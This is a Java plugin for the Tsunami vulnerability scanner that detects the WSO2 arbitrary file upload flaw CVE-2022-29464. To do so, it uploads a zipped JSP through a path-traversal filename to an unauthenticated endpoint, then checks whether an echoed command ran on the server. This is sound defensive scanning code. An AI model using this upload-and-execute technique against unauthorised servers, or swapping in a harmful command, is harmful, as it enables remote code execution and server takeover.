/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202229464;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONNECTION;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.inject.Inject;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okio.Buffer;

/** A {@link VulnDetector} that detects the CVE-2022-29464 vulnerability. */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202229464VulnDetector",
    version = "0.1",
    description = "This detector checks wide range of WSO2 products RCE (CVE-2022-29464)",
    author = "yuradoc (yuradoc.research@gmail.com)",
    bootstrapModule = Cve202229464VulnDetectorBootstrapModule.class)
public class Cve202229464VulnDetector implements VulnDetector {
  @VisibleForTesting
  static final String TEST_STR_RCE = Long.toHexString(Double.doubleToLongBits(Math.random()));

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String FILE_UPLOAD_PATH = "fileupload/toolsAny";
  private static final String FILE_NAME =
      "authenticationendpoint-test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
  private static final String FILE_NAME_EXT = ".war";
  private static final String FILE_REMOTE_LOCATION =
      "../../../../repository/deployment/server/webapps/" + FILE_NAME;
  private static final String FUNC_OS_RCE = "echo " + TEST_STR_RCE;
  private static final String FUNC_OS_RCE_PLACEHOLDER = "{{CMD}}";
  private static final Duration UNPACK_TIMEOUT = Duration.ofSeconds(18);
  private final HttpClient httpClient;
  private final Clock utcClock;
  private final String requestBodyTemplate;

  @Inject
  Cve202229464VulnDetector(HttpClient httpClient, @UtcClock Clock utcClock) throws IOException {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    requestBodyTemplate =
        Resources.toString(Resources.getResource(this.getClass(), "requestBody.jsp"), UTF_8);
  }

  public static byte[] makeZip(String fileName, String content) throws IOException {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ZipOutputStream zos = new ZipOutputStream(baos);
    ZipEntry zipEntry = new ZipEntry(fileName);
    zos.putNextEntry(zipEntry);
    zos.write(content.getBytes());
    zos.closeEntry();
    zos.close();
    return baos.toByteArray();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202229464VulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @VisibleForTesting
  String buildRootUri(NetworkService networkService) {
    return String.format("https://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    final String rootUri = buildRootUri(networkService);
    final String targetUploadUri = rootUri + FILE_UPLOAD_PATH;

    String requestBody = requestBodyTemplate.replace(FUNC_OS_RCE_PLACEHOLDER, FUNC_OS_RCE);

    try {
      MultipartBody mBody =
          new MultipartBody.Builder()
              .setType(MultipartBody.FORM)
              .addFormDataPart(
                  FILE_REMOTE_LOCATION + FILE_NAME_EXT,
                  FILE_REMOTE_LOCATION + FILE_NAME_EXT,
                  RequestBody.create(
                      MediaType.parse("application/zip"), makeZip("index.jsp", requestBody)))
              .build();

      Buffer sink = new Buffer();
      mBody.writeTo(sink);

      HttpResponse response =
          httpClient.send(
              post(targetUploadUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, mBody.contentType().toString())
                          .addHeader(CONNECTION, "close")
                          .build())
                  .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
                  .build(),
              networkService);

      String body = response.bodyString().get();
      if (!(response.status().code() == HttpStatus.OK.code()
          && body.length() > 0
          && Double.parseDouble(body) > 0)) {
        return false;
      }

      Uninterruptibles.sleepUninterruptibly(UNPACK_TIMEOUT);

      response =
          httpClient.send(
              get(rootUri + FILE_NAME).setHeaders(HttpHeaders.builder().build()).build(),
              networkService);

      if (response.status().code() == HttpStatus.OK.code()
          && response.bodyString().isPresent()
          && response.bodyString().get().contains(TEST_STR_RCE)) {
        return true;
      }
    } catch (Exception e) {
      logger.atWarning().log("Failed to send request.");
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-29464"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
                .setDescription(
                    "WSO2 API Manager 2.2.0, up to 4.0.0,WSO2 Identity Server 5.2.0, up"
                        + " to 5.11.0,WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0,"
                        + " 5.6.0,WSO2 Identity Server as Key Manager 5.3.0, up to"
                        + " 5.11.0,WSO2 Enterprise Integrator 6.2.0, up to 6.6.0,WSO2 Open"
                        + " Banking AM 1.4.0, up to 2.0.0,WSO2 Open Banking KM 1.4.0, up"
                        + " to 2.0.0 contains a arbitrary file upload vulnerability. Due"
                        + " to improper validation of user input, a malicious actor could"
                        + " upload an arbitrary file to a user controlled location of the"
                        + " server. By leveraging the arbitrary file upload vulnerability,"
                        + " it is further possible to gain remote code execution on the"
                        + " server.")
                .setRecommendation(
                    "Update WSO2 API Manager to 4.2.0, Identity Server to"
                        + " 6.1.0, Enterprise Integrator to 7.1.0, and"
                        + " Open Banking AM and KM to 3.0.0."))
        .build();
  }
}
